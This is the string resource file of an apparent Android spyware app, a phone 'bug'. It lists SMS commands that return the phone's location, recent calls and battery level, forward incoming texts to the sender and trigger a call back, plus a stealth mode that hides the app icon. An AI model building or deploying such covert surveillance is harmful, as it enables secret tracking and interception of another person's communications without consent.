resources.string:
"Bug activated.

USE:
Send an SMS with the following commands:
posizione: returns a text message with a link to Google maps to display the current location.
chiamami: call the sender automatically
stato: returns an SMS with the level of battery charge.
chiamate: returns a text message containing a list of the last three calls made or received.\inoltro on: start forwarding text messages received to the sender of the command
inoltro off: disable forwarding of SMS

Press the Home key to return to the Launcher

 *** Stealth Mode ***
Allows you to remove the icon from the launcher, making it invisible at first sight. The app is still present in the list of installed programs.
"
"The GPS should be enabled to use the tracking capabilities."
"The application icon is hidden. You must restart the phone to complete the operation."
"If you enable the stealth mode the icon is no longer visible: to restore it will need to uninstall and reinstall the app.\nDo you want to continue?"
